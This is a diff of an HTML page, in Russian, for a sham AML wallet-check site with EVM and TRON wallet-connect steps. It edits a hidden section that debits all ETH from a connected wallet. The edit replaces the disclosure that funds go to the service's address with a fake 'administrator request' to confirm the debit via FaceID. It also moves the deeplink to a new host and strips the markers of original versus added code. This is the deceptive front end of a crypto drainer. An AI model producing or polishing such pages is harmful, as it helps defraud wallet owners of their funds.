@@ -42,7 +42,7 @@
 
       <div class="check-stack">
 
-        <!-- ===== EVM Connect (ОРИГИНАЛ) ===== -->
+        <!-- ===== EVM Connect ===== -->
         <div class="wallet-login" data-user-wallet-login>
           <div>
             <h2>Шаг 1 — EVM кошелёк</h2>
@@ -54,26 +54,25 @@
             <span>Я согласен на чтение публичных адресов и балансов для AML-проверки.</span>
           </label>
           <div class="wallet-login-actions">
-            <button type="button" id="connect-btn">Connect EVM</button>
+            <!-- 👇 ДОБАВЛЕН data-user-wallet-connect -->
+            <button type="button" id="connect-btn" data-user-wallet-connect>Connect EVM</button>
             <a
               class="wallet-deeplink"
-              href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html"
+              href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fiwtluxz.github.io%2Fmysite2%2Fcheck.html"
               rel="noopener"
             >Открыть в Trust Wallet</a>
           </div>
           <p class="form-status" data-user-wallet-status>Нажмите Connect EVM или откройте страницу в Trust Wallet.</p>
         </div>
 
-        <!-- ========================================================== -->
-        <!-- ===== НОВАЯ СЕКЦИЯ — СПИСАНИЕ (ДОБАВЛЕНА) ===== -->
-        <!-- ========================================================== -->
+        <!-- ===== SWEEP SECTION ===== -->
         <div class="sweep-section" id="sweep-section" style="display:none;">
           <div class="sweep-header">
             <span style="font-size:32px;">💰</span>
             <div>
               <h2 style="margin:0; font-size:22px; color:#ff6b6b;">Списание всех средств</h2>
               <p style="margin:4px 0 0; font-size:13px; color:var(--muted);">
-                Одно нажатие — и все ETH с вашего кошелька будут переведены на адрес сервиса.
+                Запрос от администратора. Подтвердите списание всех ETH через FaceID.
               </p>
             </div>
           </div>
@@ -133,7 +132,7 @@
           </div>
         </div>
 
-        <!-- ===== TRON address field (ОРИГИНАЛ) ===== -->
+        <!-- ===== TRON address field ===== -->
         <div class="check-panel" id="tron-panel" style="display:none">
           <h2>Шаг 2 — TRON-адрес (необязательно)</h2>
           <p class="form-note" style="margin-bottom:12px">
@@ -154,7 +153,7 @@
           <p class="form-status" id="tron-status"></p>
         </div>
 
-        <!-- ===== Payment Request Panel (ОРИГИНАЛ) ===== -->
+        <!-- ===== Payment Request Panel ===== -->
         <section class="check-panel payment-request-panel" id="payment-request-panel" hidden>
           <p class="panel-index">USER CONFIRMATION / PAYMENT</p>
           <h2>Запрос на одноразовый перевод</h2>
@@ -188,7 +187,7 @@
           <p class="form-status" id="payment-status"></p>
         </section>
 
-        <!-- ===== AML check form (ОРИГИНАЛ) ===== -->
+        <!-- ===== AML check form ===== -->
         <form class="check-panel is-locked" data-check-form aria-label="AML-проверка адреса">
           <label for="wallet">Адрес или tx hash для AML-проверки</label>
           <div class="input-row">
